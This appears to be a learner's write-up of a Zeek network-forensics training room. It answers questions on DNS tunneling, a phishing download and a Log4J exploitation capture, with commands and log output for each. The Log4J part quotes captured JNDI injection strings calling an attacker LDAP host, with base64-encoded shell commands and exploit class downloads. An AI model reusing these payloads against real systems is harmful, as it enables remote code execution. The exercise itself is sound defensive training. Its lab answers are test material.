---
Put your Zeek skills into practice and analyse network traffic.
---

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/644e18e84c28156e31fb2a420611bb29.png)

### Anomalous DNS 

An alert triggered: "Anomalous DNS Activity".

The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. 



Investigate the dns-tunneling.pcap file. Investigate the dns.log file. What is the number of DNS records linked to the IPv6 address?
 DNS "AAAA" records store IPV6 addresses.

```
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# ls
clear-logs.sh  dns-tunneling.pcap
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# zeekctl start
Warning: new zeek version detected (run the zeekctl "deploy" command)
starting zeek ...
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# zeekctl status
Warning: new zeek version detected (run the zeekctl "deploy" command)
Name         Type       Host          Status    Pid    Started
zeek         standalone localhost     running   2535   10 Dec 17:18:24

root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# zeek -Cr dns-tunneling.pcap 
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# ls
clear-logs.sh  dns-tunneling.pcap  http.log  packet_filter.log
conn.log       dns.log             ntp.log

root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# head dns.log 
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	dns
#open	2022-12-10-17-46-29
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	trans_id	rtt	query	qclass	qclass_name	qtype	qtype_name	rcode	rcode_name	AATC	RD	RA	Z	answers	TTLs	rejected

root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# cat dns.log | zeek-cut qtype_name | grep -i 'AAAA' | wc -l
320

```


*320*


Investigate the conn.log file. What is the longest connection duration?
The "duration" value represents the connection time between two hosts.

```
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# head conn.log 
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	conn
#open	2022-12-10-17-46-29
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents

root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# cat conn.log | zeek-cut duration | sort -nr | sed -n "1p"
9.420791

```

*9.420791*


Investigate the dns.log file. Filter all unique DNS queries. What is the number of unique domain queries?

You need to use the DNS query values for summarising and counting the number of unique domains. There are lots of "***.cisco-update.com" DNS queries, you need to filter the main address and find out the rest of the queries that don't contain the "***.cisco-update.com" pattern. You can filter the main "***.cisco-update.com" DNS pattern as "cisco-update.com" with the following command; "cat dns.log | zeek-cut query |rev | cut -d '.' -f 1-2 | rev | head"

```
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# head dns.log
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	dns
#open	2022-12-10-17-46-29
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	trans_id	rtt	query	qclass	qclass_name	qtype	qtype_name	rcode	rcode_name	AATC	RD	RA	Z	answers	TTLs	rejected

root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort | uniq
_tcp.local
cisco-update.com
in-addr.arpa
ip6.arpa
rhodes.edu
ubuntu.com
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort | uniq |wc -l
6

```

*6*



There are a massive amount of DNS queries sent to the same domain. This is abnormal. Let's find out which hosts are involved in this activity. Investigate the conn.log file. What is the IP address of the source host?

```
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# head conn.log 
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	conn
#open	2022-12-10-17-46-29
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents

root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# cat conn.log | zeek-cut id.orig_h | sed -n "1p"
10.20.57.3

```


*10.20.57.3*

### Phishing 



An alert triggered: "Phishing Attempt".

The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. 




Investigate the logs. What is the suspicious source address? Enter your answer in defanged format.
Cyberchef can defang.

```
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/phishing# zeek -Cr phishing.pcap 
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/phishing# ls
clear-logs.sh  file-extract-demo.zeek  packet_filter.log
conn.log       files.log               pe.log
dhcp.log       hash-demo.zeek          phishing.pcap
dns.log        http.log

root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/phishing# head conn.log 
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	conn
#open	2022-12-10-18-25-03
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents

root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/phishing# cat conn.log | zeek-cut id.orig_h | sed -n "1p"
10.6.27.102

defanging ip with cyberchef

10[.]6[.]27[.]102
```


*10[.]6[.]27[.]102*


Investigate the http.log file. Which domain address were the malicious files downloaded from? Enter your answer in defanged format.
Cyberchef can defang.

```
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/phishing# head http.log 
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	http
#open	2022-12-10-18-25-03
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	trans_depth	method	host	uri	referrer	version	user_agent	origin	request_body_len	response_body_len	status_code	status_msg	info_code	info_msg	tags	username	password	proxied	orig_fuids	orig_filenames	orig_mime_types	resp_fuids	resp_filenames	resp_mime_types

root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/phishing# cat http.log | zeek-cut uri host
/ncsi.txt	www.msftncsi.com
/Documents/Invoice&MSO-Request.doc	smart-fax.com
/knr.exe	smart-fax.com

defanging url with cyberchef


```

*smart-fax[.]com*

Investigate the malicious document in VirusTotal. What kind of file is associated with the malicious document?
Search MD5 value in Virustotal. VT>Relations

```

search smart-fax.com on virustotal

https://www.virustotal.com/gui/domain/smart-fax.com

then go to relations and follow link of .doc
 	Invoice&MSO-Request.doc 

then again go to relations

https://www.virustotal.com/gui/file/f808229aa516ba134889f81cd699b8d246d46d796b55e13bee87435889a054fb/relations
File type

VBA 


```


*vba*



Investigate the extracted malicious .exe file. What is the given file name in Virustotal?

```

search on google knr.exe
to get md5 hash then go to virustotal

https://app.any.run/tasks/ec3cedca-0132-4b76-afba-ae74fb93fe99/

now go to reports and copy hash

	
CC28E40B46237AB6D5282199EF78C464

so finally in virus total search and the name is
https://www.virustotal.com/gui/file/749e161661290e8a2d190b1a66469744127bc25bf46e5d0c6f2e835f4b92db18

PleaseWaitWindow.exe
```


*PleaseWaitWindow.exe*


Investigate the malicious .exe file in VirusTotal. What is the contacted domain name? Enter your answer in defanged format.
VT>Behavior>DNS Resolutions. Cyberchef can defang.

```
go to behaviour > DNS Resolutions

 125.21.88.13.in-addr.arpa
212.161.61.168.in-addr.arpa
217.106.137.52.in-addr.arpa
83.188.255.52.in-addr.arpa
dunlop.hopto.org 

so hopto.org ... defanging with cyberchef , because dunlop is a subdomain
or just hopto[.]org
```


*hopto[.]org*



Investigate the http.log file. What is the request name of the downloaded malicious .exe file?


*knr.exe*

### Log4J 

An alert triggered: "Log4J Exploitation Attempt".

The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. 


Investigate the log4shell.pcapng file with detection-log4j.zeek script. Investigate the signature.log file. What is the number of signature hits?

```
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# ls
clear-logs.sh  detection-log4j.zeek  log4shell.pcapng
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# cat detection-log4j.zeek 
# Load scan-NG Package!
@load /opt/zeek/share/zeek/site/cve-2021-44228

root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# zeek -Cr log4shell.pcapng detection-log4j.zeek 

root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# head signatures.log 
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	signatures
#open	2022-12-10-18-49-29
#fields	ts	uid	src_addr	src_port	dst_addr	dst_port	note	sig_id	event_msg	sub_msg	sig_count	host_count

root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# cat signatures.log | zeek-cut uid | wc -l
3

```


*3*



Investigate the http.log file. Which tool is used for scanning?
User-agent info can help.

```
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# head http.log 
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	http
#open	2022-12-10-18-49-29
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	trans_depth	method	host	uri	referrer	version	user_agent	origin	request_body_len	response_body_len	status_code	status_msg	info_code	info_msg	tags	username	password	proxied	orig_fuids	orig_filenames	orig_mime_types	resp_fuids	resp_filenames	resp_mime_types

root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# cat http.log | zeek-cut user_agent | sed -n "10,12p"
${jndi:ldap://127.0.0.1:1389}
Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)



```


*nmap*

Investigate the http.log file. What is the extension of the exploit file?
Uri info can help.

```
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# head http.log 
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	http
#open	2022-12-10-18-49-29
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	trans_depth	method	host	uri	referrer	version	user_agent	origin	request_body_len	response_body_len	status_code	status_msg	info_code	info_msg	tags	username	password	proxied	orig_fuids	orig_filenames	orig_mime_types	resp_fuids	resp_filenames	resp_mime_types
#types	time	string	addr	port	addr	port	count	string	string	string	string	string	string	string	count	count	count	string	count	string	set[enum]	string	string	set[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string]
1640023505.960608	C1Azru1VLUo3ZiDC33	172.17.0.1	60314	172.17.0.2	8080	1	GET	127.0.0.1:8080	/	-1.1	SecurityNik Testing	-	0	91	400	(empty)	-	-	(empty)	-	-	-	-	-	-Fq5jbu3EpCk5tV3f18	-	text/json
1640023652.119439	CEcjx737MVaGytquj1	172.17.0.2	51832	192.168.56.102	443	1	GET	192.168.56.102:443/ExploitQ8v7ygBW4i.class	-	1.1	Java/1.8.0_181	-	0	1216	200	OK	-	-	CVE_2021_44228::LOG4J_RCE	--	-	-	-	-	Fm2Pk636DiMArmDn03	-	application/x-java-applet

root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# cat http.log | zeek-cut uri | sort | uniq
/
/Exploit6HHc3BcVzI.class
/ExploitQ8v7ygBW4i.class
/ExploitSMMZvT8GXL.class
/testing1
/testing123
testing1


```


*.class*

Investigate the log4j.log file. Decode the base64 commands. What is the name of the created file?
You can use online decoders or use Linux terminal features. "echo 'base64 data' | base64 --decode"

```
root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# head log4j.log
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	log4j
#open	2022-12-10-18-49-29
#fields	ts	uid	http_uri	uri	stem	target_hosttarget_port	method	is_orig	name	value	matched_name	matched_value
#types	time	string	string	string	string	string	string	string	bool	string	string	bool	bool
1640023652.008511	CUcaDK1mHG3gFB0439	/	192.168.56.102:389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=	192.168.56.102:389	192.168.56.102	389	GET	T	X-API-VERSION	${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}	F	T
1640025554.661073	C43zpa28ReOfCY0Qvd	/	192.168.56.102:389/Basic/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==	192.168.56.102:389	192.168.56.102	389	GET	T	X-API-VERSION	${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==}	F	T

d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==

┌──(kali㉿kali)-[~]
└─$ echo 'd2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==' | base64 -d
which nc > /tmp/pwned

┌──(kali㉿kali)-[~]
└─$ echo 'dG91Y2ggL3RtcC9wd25lZAo=' | base64 -d         
touch /tmp/pwned

```


*pwned*

### Conclusion 



Congratulations! You just finished the Zeek exercises.

If you like this content, make sure you visit the following rooms later on THM;

    Snort
    Snort Challenges 1
    Snort Challenges 2
    Wireshark
    NetworkMiner

Note that there are challenge rooms available for the discussed content. Use the search option to find them! Happy hacking! 


[[Zeek]]